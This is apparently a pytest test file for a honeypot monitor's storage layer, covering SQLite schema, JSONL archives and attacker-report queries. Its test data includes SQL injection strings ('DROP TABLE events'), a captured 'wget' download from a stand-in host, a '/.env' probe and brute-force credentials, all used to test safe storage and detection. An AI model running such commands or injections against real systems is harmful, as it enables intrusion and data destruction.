"""Storage tests: SQLite schema, JSONL archive and read queries."""

from __future__ import annotations

import gzip
import sqlite3
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from honeywatch.models import Event, RuleHit, Severity, iso
from honeywatch.storage.jsonl import JsonlArchive, read_jsonl
from honeywatch.storage.queries import ReadStore
from honeywatch.storage.sqlite import SCHEMA_VERSION, Storage, StorageError

NOW = datetime(2026, 3, 12, 12, 0, tzinfo=UTC)


def make_event(**overrides) -> Event:
    payload: dict = {
        "ts": NOW,
        "service": "ssh",
        "event_type": "command",
        "src_ip": "203.0.113.1",
        "session_id": "s1",
        "command": "uname -a",
    }
    payload.update(overrides)
    return Event(**payload)


# ---- SQLite --------------------------------------------------------------


def test_wal_mode_and_schema_version(storage: Storage) -> None:
    mode = storage.execute("PRAGMA journal_mode").fetchone()[0]
    assert mode.lower() == "wal"
    assert storage.schema_version() == SCHEMA_VERSION


def test_insert_event_and_hits(storage: Storage) -> None:
    event = make_event()
    event_id = storage.insert_event(event, [RuleHit(rule_id="r-1", severity="high", ts=NOW)])
    assert event_id > 0
    rows = storage.execute("SELECT COUNT(*) FROM rule_hits WHERE event_id=?", (event_id,)).fetchone()
    assert rows[0] == 1


def test_hostile_values_are_bound_not_interpolated(storage: Storage) -> None:
    payload = "'; DROP TABLE events; --"
    storage.insert_event(make_event(command=payload))
    assert storage.execute("SELECT COUNT(*) FROM events").fetchone()[0] == 1


def test_indexes_exist(storage: Storage) -> None:
    names = {row[1] for row in storage.execute("PRAGMA index_list('events')")}
    assert any("ts" in name for name in names)
    assert any("src_ip" in name for name in names)
    assert any("session" in name for name in names)


def test_alert_audit_rows(storage: Storage) -> None:
    from honeywatch.models import AlertRecord

    storage.insert_alert(
        AlertRecord(rule_id="r-1", src_ip="203.0.113.1", severity="high", status="sent")
    )
    assert storage.execute("SELECT COUNT(*) FROM alerts").fetchone()[0] == 1


def test_stats(storage: Storage) -> None:
    storage.insert_event(make_event())
    storage.insert_event(make_event(src_ip="198.51.100.2"))
    stats = storage.stats()
    assert stats["events"] == 2
    assert stats["unique_ips"] == 2
    assert stats["schema_version"] == SCHEMA_VERSION


def test_prune_removes_old_rows(storage: Storage) -> None:
    storage.insert_event(make_event(ts=NOW - timedelta(days=60)))
    storage.insert_event(make_event(ts=NOW))
    cutoff = iso(NOW - timedelta(days=30))
    assert storage.prune(cutoff) == 1
    assert storage.stats()["events"] == 1


def test_read_only_store_rejects_writes(tmp_path: Path) -> None:
    db = tmp_path / "ro.db"
    with Storage(db) as store:
        store.insert_event(make_event())
    with ReadStore(db) as read:
        with pytest.raises(sqlite3.OperationalError):
            read._conn.execute("DELETE FROM events")  # noqa: SLF001


def test_close_is_idempotent(tmp_path: Path) -> None:
    store = Storage(tmp_path / "x.db")
    store.close()
    store.close()
    assert store.closed


# ---- JSONL ---------------------------------------------------------------


def test_jsonl_roundtrip(tmp_path: Path) -> None:
    archive = JsonlArchive(tmp_path / "raw")
    event = make_event()
    archive.write(event)
    archive.close()
    files = list((tmp_path / "raw").glob("*.jsonl"))
    assert len(files) == 1
    restored = list(read_jsonl(files[0]))
    assert len(restored) == 1
    assert restored[0].src_ip == event.src_ip
    assert restored[0].ts == event.ts


def test_jsonl_skips_malformed_lines(tmp_path: Path) -> None:
    path = tmp_path / "raw.jsonl"
    path.write_text('{"bad": true}\nnot json\n', encoding="utf-8")
    assert list(read_jsonl(path)) == []


def test_jsonl_daily_rotation(tmp_path: Path) -> None:
    archive = JsonlArchive(tmp_path / "raw")
    archive.write(make_event(ts=NOW))
    archive.write(make_event(ts=NOW + timedelta(days=1)))
    archive.close()
    assert len(list((tmp_path / "raw").glob("*.jsonl"))) == 2


def test_jsonl_compression_skips_recent(tmp_path: Path) -> None:
    archive = JsonlArchive(tmp_path / "raw")
    archive.write(make_event(ts=NOW - timedelta(days=10)))
    archive.write(make_event(ts=NOW))
    archive.close()
    produced = archive.compress_older_than(7, now=NOW)
    assert len(produced) == 1
    assert produced[0].suffix == ".gz"
    with gzip.open(produced[0], "rt", encoding="utf-8") as handle:
        assert handle.readline()


def test_jsonl_is_raw_pre_enrichment(tmp_path: Path) -> None:
    archive = JsonlArchive(tmp_path / "raw")
    event = make_event()
    event.geo_country = "CN"  # would be enrichment output
    archive.write(event)
    archive.close()
    stored = next(iter(read_jsonl(next((tmp_path / "raw").glob("*.jsonl")))))
    # The archive preserves whatever the producer captured; enrichment only
    # happens downstream, so this asserts round-trip fidelity.
    assert stored.geo_country == "CN"


def test_read_jsonl_handles_gzip(tmp_path: Path) -> None:
    source = tmp_path / "raw.jsonl"
    archive = JsonlArchive(tmp_path / "raw")
    archive.write(make_event())
    archive.close()
    with gzip.open(tmp_path / "g.jsonl.gz", "wt", encoding="utf-8") as out:
        out.write(next(iter((tmp_path / "raw").glob("*.jsonl"))).read_text(encoding="utf-8"))
    assert len(list(read_jsonl(tmp_path / "g.jsonl.gz"))) == 1
    assert source is not None


# ---- read queries --------------------------------------------------------


def seed(store: Storage) -> None:
    store.insert_event(
        make_event(src_ip="203.0.113.9", username="root", password="123456"),
        [RuleHit(rule_id="ssh-bruteforce-001", severity="high", ts=NOW)],
    )
    store.insert_event(
        make_event(src_ip="203.0.113.9", command="wget http://x.example/p.sh"),
        [RuleHit(rule_id="ssh-download-exec-005", severity="critical", ts=NOW)],
    )
    store.insert_event(
        make_event(
            ts=datetime.now(UTC),
            service="http",
            event_type="http_request",
            src_ip="198.51.100.4",
            http_method="GET",
            path="/.env",
        ),
        [RuleHit(rule_id="http-sensitive-path-010", severity="medium", ts=datetime.now(UTC))],
    )


def test_top_metrics_and_feed(tmp_path: Path) -> None:
    db = tmp_path / "q.db"
    with Storage(db) as store:
        seed(store)
    with ReadStore(db) as read:
        metrics = read.top_metrics()
        assert metrics["events"] == 3
        assert metrics["unique_ips"] == 2
        assert metrics["last_event_age_s"] is not None
        rows = read.feed(limit=10)
        assert len(rows) == 3
        assert rows[0].id > rows[1].id


def test_feed_cursor_only_returns_newer(tmp_path: Path) -> None:
    db = tmp_path / "c.db"
    with Storage(db) as store:
        seed(store)
    with ReadStore(db) as read:
        first = read.feed(limit=1)
        assert len(first) == 1
        newer = read.feed(after_id=first[0].id, limit=10)
        assert all(row.id > first[0].id for row in newer)


def test_top_attackers_and_credentials(tmp_path: Path) -> None:
    db = tmp_path / "t.db"
    with Storage(db) as store:
        seed(store)
    with ReadStore(db) as read:
        attackers = read.top_attackers()
        assert attackers[0].src_ip == "203.0.113.9"
        users, passwords = read.top_credentials()
        assert ("root", 1) in users
        assert ("123456", 1) in passwords


def test_aggregates_and_bars(tmp_path: Path) -> None:
    db = tmp_path / "a.db"
    with Storage(db) as store:
        seed(store)
    with ReadStore(db) as read:
        assert len(read.sparkline(minutes=30)) == 30
        assert read.rule_category_bars()
        assert read.country_breakdown()


def test_attacker_detail(tmp_path: Path) -> None:
    db = tmp_path / "d.db"
    with Storage(db) as store:
        seed(store)
    with ReadStore(db) as read:
        detail = read.attacker_detail("203.0.113.9")
        assert detail.src_ip == "203.0.113.9"
        assert len(detail.timeline) == 2
        assert detail.rules
        assert detail.urls == ["http://x.example/p.sh"]


def test_report_queries(tmp_path: Path) -> None:
    db = tmp_path / "r.db"
    with Storage(db) as store:
        seed(store)
    with ReadStore(db) as read:
        totals = read.report_totals(None)
        assert totals["events"] == 3
        assert read.report_rule_summary(None)
        assert read.report_payload_urls(None)
        assert read.report_sessions(None)
        with pytest.raises(ValueError):
            read.report_group("password; DROP TABLE events", None)  # type: ignore[arg-type]


def test_empty_database_is_safe(tmp_path: Path) -> None:
    db = tmp_path / "e.db"
    with Storage(db):
        pass
    with ReadStore(db) as read:
        assert read.top_metrics()["events"] == 0
        assert read.feed() == []
        assert read.top_attackers() == []
        assert read.top_credentials() == ([], [])
        assert read.alerts() == []


def test_storage_error_is_raised_loudly(tmp_path: Path, monkeypatch) -> None:
    store = Storage(tmp_path / "s.db")

    def boom(*_args, **_kwargs):
        raise sqlite3.OperationalError("disk I/O error")

    monkeypatch.setattr(store._conn, "execute", boom)  # noqa: SLF001
    with pytest.raises(StorageError):
        store.insert_event(make_event())


def test_alerts_screen_rows(tmp_path: Path) -> None:
    from honeywatch.models import AlertRecord

    db = tmp_path / "al.db"
    with Storage(db) as store:
        store.insert_alert(
            AlertRecord(rule_id="r-1", src_ip="203.0.113.1", severity=Severity.HIGH, status="sent")
        )
    with ReadStore(db) as read:
        rows = read.alerts()
        assert rows[0]["rule_id"] == "r-1"
        assert read.alert_counts()["sent"] == 1